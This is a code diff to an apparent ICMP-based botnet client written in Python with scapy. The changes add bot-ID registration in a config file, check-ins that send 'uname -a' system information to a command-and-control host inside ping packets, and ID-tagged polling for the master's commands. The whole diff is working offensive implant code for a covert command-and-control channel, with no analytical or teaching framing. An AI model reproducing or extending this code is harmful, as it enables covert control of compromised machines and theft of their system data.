@@ -12,13 +12,31 @@ import signal
 import subprocess as sub
 from scapy.all import sr,sr1,ICMP,IP
 
+
+def getId():
+	#print "[D] Getting bot Id"
+	conf_file = open('pingc.conf','r')
+	id='null'
+	for line in conf_file:
+		if 'id=' in line:
+			id=line[3:]
+	#print "[D] Return id: " + id
+	return id	
+
+def collectId(botId):
+	#print "[D] Writing bot Id: ",botId
+	conf_file = open('pingc.conf','w')
+	idstr="id="+str(botId)
+	conf_file.write(idstr)
+	conf_file.close()
+
 def handler(signum, frame):
         print 'Bye!'
         sys.exit()
 
 def sendPingRequest(command):
-	packet=IP(dst=sys.argv[1])/ICMP()/command
-        #packet.show()
+	packet=IP(dst=sys.argv[1])/ICMP()/str(command)
+        packet.show()
         p=sr1(packet,timeout=5)
         #p.show()
 	print "[*] String sent to C2 server: " + command
@@ -47,7 +65,9 @@ def processReply(p):
         	print "[*] Master requesting sysinfo"
 		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                 output, errors = proc.communicate()
-                p=sendPingRequest('sysinfo %s' % output)
+                id=getId()
+		sendRequest = 'sysinfo %s %s' % (str(id),output)
+		p=sendPingRequest(sendRequest)
 		if p:	
 			processReply(p)
 		#print output
@@ -61,10 +81,27 @@ def processReply(p):
                 print "[*] Master says sleep for %s seconds" % (seconds)
                 print "[*] Sleeping..."
                 time.sleep(int(seconds))
-                p=sendPingRequest("What shall I do master?")
+		id=getId()
+		sendStr="What shall I do master? " + str(id)
+                p=sendPingRequest(sendStr)
                 processReply(p)
+	elif 'id=' in response:
+		print "[*] Checked in...placing id in conf file"
+		collectId(response[3:])
 
 def main(argv):
+	id = getId()
+	if id=='null':
+		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
+                output, errors = proc.communicate()
+                p=sendPingRequest('Checkin %s' % output)
+                if p:
+                        processReply(p)
+                #print output
+                print errors
+		if p:
+			processReply(p)
+		#print "[D] id==null"
 	while True:
 		if len(argv) < 1:
 			print "----------------------------"
@@ -73,7 +110,9 @@ def main(argv):
 			print "----------------------------"
 			exit()
 		signal.signal(signal.SIGINT, handler)
-		p=sendPingRequest("What shall I do master?")
+		id = getId()
+		sendStr="What shall I do master? " + id
+		p=sendPingRequest(sendStr)
 		if p:
 			processReply(p)
 		print "[*] Sleeping now..."
